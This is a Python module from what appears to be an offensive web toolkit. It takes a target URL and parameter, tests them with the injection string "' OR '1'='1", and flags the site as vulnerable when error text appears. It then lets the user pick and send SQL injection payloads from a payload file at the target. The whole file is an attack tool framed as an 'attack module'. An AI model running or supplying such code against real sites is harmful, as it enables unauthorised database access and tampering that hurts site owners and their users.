# web_apps/sql_injection.py
import requests

SQLI_PAYLOAD_FILE = "web_apps/payloads/sqli_payloads.txt"

def check_sqli_vulnerability(url, param):
    """Check if a web application is vulnerable to SQL Injection."""
    test_payload = "' OR '1'='1"
    response = requests.get(url, params={param: test_payload})

    if "error" in response.text.lower() or "syntax" in response.text.lower():
        print(f"[+] The website is vulnerable to SQL Injection! ({url})")
        return True
    else:
        print("[-] No SQL Injection vulnerability detected.")
        return False

def load_sqli_payloads():
    """Load SQLi payloads from a file."""
    try:
        with open(SQLI_PAYLOAD_FILE, "r") as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print("[-] SQL Injection payload file not found!")
        return []

def exploit_sqli(url, param):
    """Allow the user to select and run different SQL Injection payloads."""
    payloads = load_sqli_payloads()
    if not payloads:
        return

    print("\n[+] Available SQL Injection Payloads:")
    for i, payload in enumerate(payloads, start=1):
        print(f"{i}) {payload}")

    choice = input("\nSelect a payload number to use: ")
    try:
        selected_payload = payloads[int(choice) - 1]
        response = requests.get(url, params={param: selected_payload})
        print(f"[+] SQL Injection Payload Sent: {selected_payload}")
        print("[*] Check the target database for execution.")
    except (IndexError, ValueError):
        print("[-] Invalid choice!")

def sqli_attack():
    """Main function for SQL Injection attack module."""
    url = input("Enter the target URL: ")
    param = input("Enter the parameter to test (e.g., id, user, query): ")

    if check_sqli_vulnerability(url, param):
        exploit_sqli(url, param)
